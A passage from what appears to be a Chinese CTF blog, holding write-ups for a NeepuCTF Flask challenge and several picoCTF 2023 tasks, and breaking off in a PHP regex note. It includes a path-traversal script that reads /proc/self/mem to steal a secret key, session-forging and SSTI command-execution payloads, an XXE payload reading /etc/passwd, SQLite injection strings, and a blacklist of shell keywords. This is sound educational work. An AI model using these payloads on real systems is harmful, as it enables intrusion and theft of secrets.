class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session, render_template, render_template_string<br><span class="hljs-keyword">import</span> os, base64<br><span class="hljs-keyword">from</span> NeepuFile <span class="hljs-keyword">import</span> neepu_files<br><br>CuteCirno = Flask(__name__,<br>                  static_url_path=<span class="hljs-string">&#x27;/static&#x27;</span>,<br>                  static_folder=<span class="hljs-string">&#x27;static&#x27;</span><br>                  )<br><br>CuteCirno.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(base64.b64encode(os.urandom(<span class="hljs-number">30</span>)).decode()) + <span class="hljs-string">&quot;*NeepuCTF*&quot;</span><br><br><br><span class="hljs-meta">@CuteCirno.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">welcome</span>():<br>    session[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;welcome.html&#x27;</span>)<br><br><br><span class="hljs-meta">@CuteCirno.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Cirno&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;CleverCirno.html&#x27;</span>)<br><br><br><span class="hljs-meta">@CuteCirno.route(<span class="hljs-params"><span class="hljs-string">&#x27;/r3aDF1le&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">file_read</span>():<br>    filename = <span class="hljs-string">&quot;static/text/&quot;</span> + request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>, <span class="hljs-string">&#x27;comment.txt&#x27;</span>)<br>    start = request.args.get(<span class="hljs-string">&#x27;start&#x27;</span>, <span class="hljs-string">&quot;0&quot;</span>)<br>    end = request.args.get(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-string">&quot;0&quot;</span>)<br>    <span class="hljs-keyword">return</span> neepu_files(filename, start, end)<br><br><br><span class="hljs-meta">@CuteCirno.route(<span class="hljs-params"><span class="hljs-string">&#x27;/genius&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;admin&#x27;</span>) == <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(session.get(<span class="hljs-string">&#x27;admin&#x27;</span>))<br>        answer = request.args.get(<span class="hljs-string">&#x27;answer&#x27;</span>)<br>        <span class="hljs-keyword">if</span> answer <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            blacklist = [<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>,<br>                         <span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;namespace&#x27;</span>,<span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>, <span class="hljs-string">&#x27;mro&#x27;</span>, <span class="hljs-string">&#x27;base&#x27;</span>,<br>                         <span class="hljs-string">&#x27;global&#x27;</span>, <span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;00&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&#x27;pop&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>,<br>                         <span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>,<span class="hljs-string">&#x27;=&#x27;</span>]<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> blacklist:<br>                <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> answer:<br>                    answer = <span class="hljs-string">&quot;⑨&quot;</span> +<span class="hljs-string">&quot;&quot;&quot;&lt;/br&gt;&lt;img src=&quot;static/woshibaka.jpg&quot; width=&quot;300&quot; height=&quot;300&quot; alt=&quot;Cirno&quot;&gt;&quot;&quot;&quot;</span><br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> answer == <span class="hljs-string">&#x27;&#x27;</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;你能告诉聪明的⑨, 1+1的answer吗&quot;</span><br>            <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&quot;1+1=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(answer))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;mathclass.html&#x27;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        session[<span class="hljs-string">&#x27;admin&#x27;</span>] = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;你真的是我的马斯塔吗？&quot;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    CuteCirno.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>观察一下这个文件，发现 <code>SECRET_KEY</code> 是使用随机数生成的</p><p><code>/genius</code>路由会检查session，所以这一题需要我们伪造session，然后绕过过滤进行ssti</p><p>NeepuFile.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">neepu_files</span>(<span class="hljs-params">filename, start=<span class="hljs-number">0</span>, end=<span class="hljs-number">0</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    data = <span class="hljs-string">b&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        start = <span class="hljs-built_in">int</span>(start)<br>        end = <span class="hljs-built_in">int</span>(end)<br><br>    <span class="hljs-keyword">except</span>:<br>        start = <span class="hljs-number">0</span><br>        end = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">if</span> filename != <span class="hljs-string">&quot;&quot;</span> <span class="hljs-keyword">and</span> os.access(filename, os.R_OK):<br>        f = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;rb&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> start &gt;= <span class="hljs-number">0</span>:<br>            f.seek(start) <span class="hljs-comment"># 将文件指针移动到start位置</span><br>            <span class="hljs-keyword">if</span> end &gt;= start <span class="hljs-keyword">and</span> end != <span class="hljs-number">0</span>:<br>                data = f.read(end - start)<br><br>            <span class="hljs-keyword">else</span>:<br>                data = f.read()<br><br>        <span class="hljs-keyword">else</span>:<br>            data = f.read()<br><br>        f.close()<br><br>    <span class="hljs-keyword">else</span>:<br>        data = (<span class="hljs-string">&quot;File `%s` not exist or can not be read&quot;</span> % filename).encode()<br><br>    <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></table></figure><p>该文件是用来读取文件内容的，并且可以指定读取的起始地址</p><p>然后我们需要思考突破点，我们怎样才能得到key呢，这个是随机产生的，我们不可能猜出来。</p><p>由于我们不知道key，但是由于程序在运行时，会将部分信息存入内存中，所以我们只需要找到内存中带有： <code>*NeepuCTF*</code> 字样的字符串取出来就是<code>SECRET_KEY</code>了</p><p>我们编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf-8 -*-</span><br><span class="hljs-comment"># @Time : 2023/5/24 23:32</span><br><span class="hljs-comment"># @Author : Leekos</span><br><span class="hljs-comment"># @File : cute.py</span><br><span class="hljs-comment"># @Software : PyCharm</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&quot;http://neepusec.fun:28912/r3aDF1le?filename=../../../&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">maps</span>():<br><br>    req = requests.get(url=url + <span class="hljs-string">&quot;/proc/self/maps&quot;</span>)<br>    text = req.text<br>    ls = text.split(<span class="hljs-string">&quot;\n&quot;</span>)<br>    pattern = <span class="hljs-string">&quot;([0-9a-z]+)-([0-9a-z]+) rw&quot;</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> ls:<br>        map_addr = re.<span class="hljs-keyword">match</span>(pattern,l) <br>        <span class="hljs-keyword">if</span> map_addr:<br>            <span class="hljs-comment"># print(map_addr.group(1),&quot;-&quot;,map_addr.group(2))</span><br>            start = <span class="hljs-built_in">int</span>(map_addr.group(<span class="hljs-number">1</span>), <span class="hljs-number">16</span>) <span class="hljs-comment">#group(1)会得到匹配到的字符串的第1个值，模式串中第1个大括号匹配到的</span><br>            end = <span class="hljs-built_in">int</span>(map_addr.group(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)<br>            mem_url = url + <span class="hljs-string">&quot;/proc/self/mem&amp;start=&quot;</span>+<span class="hljs-built_in">str</span>(start)+<span class="hljs-string">&quot;&amp;end=&quot;</span>+<span class="hljs-built_in">str</span>(end)<br>            requ = requests.get(url=mem_url)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;*NeepuCTF*&quot;</span> <span class="hljs-keyword">in</span> requ.text:<br>                mem_pattern = <span class="hljs-string">b&quot;[A-Za-z0-9+/=]&#123;40&#125;\*NeepuCTF\*&quot;</span><br>                key = re.findall(mem_pattern, requ.content) <span class="hljs-comment"># 内存有很多不可打印字符，所以使用字节形式</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Secret Key: &quot;</span> + <span class="hljs-built_in">bytes</span>.decode(key[<span class="hljs-number">0</span>])) <span class="hljs-comment"># 将字节解码为字符串</span><br>                <span class="hljs-keyword">break</span><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    maps()<br></code></pre></td></tr></table></figure><blockquote><p>解释一下这个脚本的意思：</p><p>首先获得maps文件的值，然后分隔成列表，进行遍历。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pattern = <span class="hljs-string">&quot;([0-9a-z]+)-([0-9a-z]+) rw&quot;</span><br><span class="hljs-comment"># 匹配maps中有读写权限rw的字符串</span><br></code></pre></td></tr></table></figure><p>当匹配到时，if条件为真，将group(1)、group(2)分别转为10进制（代表内存的首末地址）</p><p>然后根据地址读取mem文件的值，如果内存中包含指定字符串就打印出key</p></blockquote><p>然后我们就可以进行session伪造了，但是由于等会需要进行ssti(但是过滤了很多)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">blacklist = [<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>,<br><span class="hljs-string">&#x27;posix&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;namespace&#x27;</span>,<span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>, <span class="hljs-string">&#x27;mro&#x27;</span>, <span class="hljs-string">&#x27;base&#x27;</span>,<br><span class="hljs-string">&#x27;global&#x27;</span>, <span class="hljs-string">&#x27;init&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;00&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-string">&#x27;get&#x27;</span>, <span class="hljs-string">&quot;url&quot;</span>, <span class="hljs-string">&#x27;pop&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>,<br><span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>,<span class="hljs-string">&#x27;=&#x27;</span>]<br></code></pre></td></tr></table></figure><p>这里有两种写法：</p><p>法一：（字符串拼接）不推荐，很难拼</p><p>法二：</p><p>这里session是可控的，所以我们可以把需要的字符串先存入session中，然后在ssti时从session中取值</p><blockquote><p><code>&#123;%print(session)%&#125;</code>这样可以把session的值打印出来</p><p>我在这里学到了新的东西，jinja2的字符串可以进行字符串切片</p><p>首先我们需要把<code>session</code>转为字符串，我们使用<code>string过滤器</code></p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">(<span class="hljs-name">session</span>|string)[<span class="hljs-name">39:50</span>]<br></code></pre></td></tr></table></figure><p>这样就可以打印出session中的一段值了</p></blockquote><p>首先使用脚本构造flask session：(这里我们把ssti需要使用的字符串也构造到session中了)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">python flask_session_cookie_manager3.py encode -s <span class="hljs-string">&quot;bxdQy9DN6FiCBXhNZFm3YwAgJ+Mn4+mRFiI0sYEP*NeepuCTF*&quot;</span> -t <span class="hljs-string">&quot;&#123;&#x27;/readflag&#x27;: 0, &#x27;__globals__&#x27;: 0, &#x27;admin&#x27;: 1, &#x27;os&#x27;: 0,&#x27;popen&#x27;: 0, &#x27;read&#x27;: 0&#125;&quot;</span><br><br>.eJyrVtIvSk1MSctJTFeyMtBRio9Pz8lPSswpjo8H8xNTcjPzlKwMdZTyi8ECBfkFqXlgFkgfkFELAMoaFFg.ZG5POw.jWk5AQmFaC172YwAbMbUXlICmm4<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/25/MoyJRDLIkpwg7ze.png" alt="image-20230525025204438"></p><p>如图，我们将session变量的值打印出来了，其中包含我们可以利用的字符串</p><p>接下来我们只需要构造如下ssti即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%print(lipsum[&quot;__globals__&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;/readflag&quot;)[&quot;read&quot;]())%&#125;<br></code></pre></td></tr></table></figure><p>结合session的payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;%print(lipsum[(session|string)[39:50]][(session|string)[69:71]][(session|string)[78:83]]((session|string)[23:32])[(session|string)[24:28]]())%&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/25/EZB1Te6imHUgFbu.png" alt="image-20230525025419723"></p><h5 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h5><p>伪造pin码</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>proc目录self下的maps&amp;&amp;mem</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>picoCTF2023</title>
    <link href="/2023/08/24/picoCTF2023/"/>
    <url>/2023/08/24/picoCTF2023/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="picoCTF2023"><a href="#picoCTF2023" class="headerlink" title="picoCTF2023"></a>picoCTF2023</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h4><p>看一下题目描述，username：<code>test</code>，password：<code>test!</code> 注意后面有一个感叹号</p><p><img src="https://s2.loli.net/2023/03/18/WBqDpo69nkJPCgT.png" alt="image-20230318163826388"></p><p>我们在登录时抓包：</p><p><img src="https://s2.loli.net/2023/03/18/DcxafRrsF7NyL4v.png" alt="image-20230318164022562"></p><p>将</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">cGljb0NURntwcm94aWVzX2Fs<br><br><span class="hljs-keyword">base</span>解码：<br><span class="hljs-keyword">picoCTF</span>&#123;proxies_al<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/18/I6xlPQmJfCWyRXL.png" alt="image-20230318164123884"></p><p>重定向之后，再将id进行base64解码：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">bF90aGVfd2F5X2QxYzBiMTEyfQ</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><br><br>base64解码：<br><br>l_the_way_d1c0b112&#125;<br></code></pre></td></tr></table></figure><p>得到flag</p><h4 id="MatchTheRegex"><a href="#MatchTheRegex" class="headerlink" title="MatchTheRegex"></a>MatchTheRegex</h4><p>正则匹配一个字符串，匹配上了给flag</p><p><img src="https://s2.loli.net/2023/03/18/gTtdy9Oivpr5AF1.png" alt="image-20230318164709389"></p><p>我们登录进去看一下源代码：</p><p><img src="https://s2.loli.net/2023/03/18/cgDqfLI3x28CsS6.png" alt="image-20230318164751967"></p><p>这里提示： <code>^p...F!?</code>，结合比赛名称，我们只需要输入<code>picoCTF!</code> 即可得到flag</p><p><img src="https://s2.loli.net/2023/03/18/hOtkZM8vNIRKcdo.png" alt="image-20230318165002410"></p><h4 id="SOAP"><a href="#SOAP" class="headerlink" title="SOAP"></a>SOAP</h4><p><img src="https://s2.loli.net/2023/03/18/W9QqtBSGTiUJcyg.png" alt="image-20230318165113124"></p><p>根据提示：<code>XML外部实体注入</code></p><p>我们点击<code>details</code>时进行抓包</p><p><img src="https://s2.loli.net/2023/03/18/fqpPKhu2IbwOnVW.png" alt="image-20230318165200165"></p><p>如图：</p><p><img src="https://s2.loli.net/2023/03/18/jMquv9RNxSwKeTG.png" alt="image-20230318165244888"></p><p>确实是xml类型的信息</p><p>我们只需要构造，引用一个外部实体即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span>[</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ID</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ID</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">data</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/18/3ec6UoBp9ytS1uv.png" alt="image-20230318165502435"></p><h4 id="More-SQLi"><a href="#More-SQLi" class="headerlink" title="More SQLi"></a>More SQLi</h4><p><img src="https://s2.loli.net/2023/03/18/tLfGqF9sQa1BSl4.png" alt="image-20230318165701861"></p><p>根据提示：<code>SQLiLite</code></p><p>查阅资料： <code>SQLite</code> 也是一个数据库</p><p><code>SQLite</code>与<code>mysql</code>类似，但是没有<code>information_schema</code>数据库</p><p>并且<code>SQLite</code>有一个不同点，注释不能使用<code>#</code>，需要使用<code>--</code> </p><p>此题的注入点为：password</p><p><strong>非预期解</strong></p><p><img src="https://s2.loli.net/2023/03/18/ZzqGTuER52vtyUF.png" alt="image-20230318170720831"></p><p>直接使用单引号’闭合，然后使用联合查询union，再使用<code>-- </code>闭合掉后面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">&#x27; union select 1-- <br></code></pre></td></tr></table></figure><p><strong>预期解</strong></p><p>首先我们已经知道了字段数为1，所以我们需要查询表名：</p><p>以下三种方式都可以，主要是注释不同</p><blockquote><p><code>SQLite</code>：</p><ol><li>每一个 <code>SQLite</code> 数据库都有一个叫 <code>sqlite_master</code> 的表，该表会自动创建。</li><li><code>sqlite_master</code>是一个特殊表, 存储数据库的元信息, 如表(table), 索引(index), 视图(view), 触发器(trigger), 可通过select查询相关信息。</li></ol></blockquote><p><img src="https://s2.loli.net/2023/03/18/3tpg6yLA2rFRuzs.png" alt="image-20230318171549316"></p><p>我们通过如下方式<code>查询sql建表语句</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">-1&#x27; union select (select group_concat(sql) from sqlite_master);<br>-1&#x27; union select (select group_concat(sql) from sqlite_master) -- <br>-1&#x27; union select (select group_concat(sql) from sqlite_master)/*<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/18/dD3GqiVOlp2U1sA.png" alt="image-20230318171945245"></p><p>(题目好像改了)</p><p><a href="https://blog.csdn.net/HBohan/article/details/120672745">SQLite注入</a></p><h3 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h3><h4 id="hideme"><a href="#hideme" class="headerlink" title="hideme"></a>hideme</h4><p><img src="https://s2.loli.net/2023/03/18/iGTKMxO6ktCVyqU.png" alt="flag"></p><p><code>foremost</code> 分离一下，得到压缩包，压缩包中有flag</p><p><img src="https://s2.loli.net/2023/03/18/6HY7crLdDuOSGj2.png" alt="flag"></p><h4 id="PcapPoisoning"><a href="#PcapPoisoning" class="headerlink" title="PcapPoisoning"></a>PcapPoisoning</h4><p>得到一个流量包文件，使用wireshark打开：</p><p><img src="https://s2.loli.net/2023/03/18/smTOihkBIy9xKGj.png" alt="image-20230318173228860"></p><p>进行长度排序，最长的那个藏了flag</p><h4 id="who-is-it"><a href="#who-is-it" class="headerlink" title="who is it"></a>who is it</h4><p><img src="https://s2.loli.net/2023/03/18/WlHmNFOf2cIaL9V.png" alt="image-20230318174504913"></p><p>这个是通过ip查询 <code>whois</code>，</p><p>什么是 <code>whois</code>？</p><p><img src="https://s2.loli.net/2023/03/18/9pYku3VODBtZ2mR.png" alt="image-20230318174636911"></p><p>所以我们根据提示，可以使用ip来查询到域名相关者的姓名信息，</p><p>我们可以通过网站：<a href="https://www.whatismyip.com/ip-whois-lookup/">查询</a></p><p>如图：</p><p><img src="https://s2.loli.net/2023/03/18/YNtjxkVw6zb1Hch.png" alt="image-20230318174851494"></p><p>名字就是flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>picoCTF2023</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php正则匹配反斜杠问题</title>
    <link href="/2023/08/24/php%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E5%8F%8D%E6%96%9C%E6%9D%A0%E9%97%AE%E9%A2%98/"/>
    <url>/2023/08/24/php%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E5%8F%8D%E6%96%9C%E6%9D%A0%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="php正则匹配反斜杠问题："><a href="#php正则匹配反斜杠问题：" class="headerlink" title="php正则匹配反斜杠问题："></a>php正则匹配反斜杠问题：</h2><p>之前做了一道题，发现php中正则匹配反斜杠好像有点问题。</p><p>我们先看下面代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;\\&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>.PHP_EOL;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\\\|\\/&quot;</span>,<span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;yes&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>乍一看这是匹配了斜杠 \  但是其实不是，这么写会<code>报错</code>的！</p><p>但是如果我们把它反过来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;\\&quot;</span>;<br>    <span 